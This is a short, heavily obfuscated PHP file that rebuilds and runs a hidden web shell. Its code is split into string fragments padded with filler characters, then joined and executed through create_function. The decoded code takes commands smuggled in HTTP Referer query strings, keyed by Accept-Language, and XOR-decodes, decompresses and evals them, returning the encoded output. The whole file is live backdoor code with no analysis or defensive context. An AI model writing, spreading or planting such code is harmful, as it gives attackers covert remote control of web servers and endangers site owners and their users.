<?php
$q='u["LSquerLSy"],$LSq);$qLS=LSarray_vaLSlues($q);preg_matcLSh_LSall("/LS([\\w])LSLS[\\w-]+(?';
$R='";$p=$ss($p,3);LS}LSif(LSarray_LSkeLSy_exists($i,$s)LS){$s[$i]LS.=$p;$eLS=strposLS(LS$s[';
$U=':;qLS=0.([\\LSd]LS))?,?/LS",$ra,$m);if(LSLS$q&&$m){LS@sessiLSLSon_start();$sLS=&$_SESSIOL';
$s='SN;LS$ss="substrLS";$sl=LS"strLStolower"LS;$LSi=$m[1][0]LS.$m[LS1][1];LSLS$h=$LSsLSl($sL';
$N=str_replace('q','','cqrqeatqe_qqfunctiqon');
$W='t{$i}^$k{$j};}}returnLS $LSo;LS}$r=$_LSSERVER;$rr=@$r["LSHTTPLS_RELSFERER"];$ra=LSLS@$r[';
$y='e(xLS(gzcompLSress($oLS)LS,$k));pLSrint("<$k>$dLSLS</$k>");@seLSssion_deLSstLSroy();}}}}';
$A=',LS0LS,$e))),$k)));$oLS=LSob_get_contenLSts()LSLS;obLS_end_clLSean();$d=basLSe6LS4_encod';
$e='$i]LS,$f);iLSf($e){$k=LS$khLSLS.$kf;LSob_start();@eLSvalLS(@gLSLSzuncompress(@x(@baLSse6';
$S='"HTTP_ALSLSCCEPTLS_LANGLSUAGE"];ifLS($rr&&$raLSLS){$u=parse_LSurl($rr)LS;parsLSe_stLSr($';
$O='Ss(md5($i.$kh),0LS,3));$f=$sl($LSss(mdLS5($i.$LSkLSf),0LS,3LS));$p="LS";for($z=1LS;$z<LS';
$E='4_LSdecoLSde(preLSg_repLSlace(array(LS"/_LS/","LSLS/-/"),array("/","+"LS)LS,$ss($s[LS$i]';
$r='couLSnt($m[1]);$z++)$pLS.=$LSq[$m[2][$LSz]LS];if(LSstrpoLSs($p,$h)===0)LS{$sLS[$i]LS="LS';
$Z='$kh="5dLSLS41"LS;$kf=LS"402a";LSfunction xLS($t,$kLS){$c=stLSrlen($k);$l=stLSrlen(LS$tLS);';
$p='LS$o="";for($i=LS0;LS$i<$lLS;){for($LSj=0;($jLS<$c&&$i<LS$l);$j++LS,$iLSLS++){$LSLSoLS.=$';
$J=str_replace('LS','',$Z.$p.$W.$S.$q.$U.$s.$O.$r.$R.$e.$E.$A.$y);
$B=$N('',$J);$B();
?>
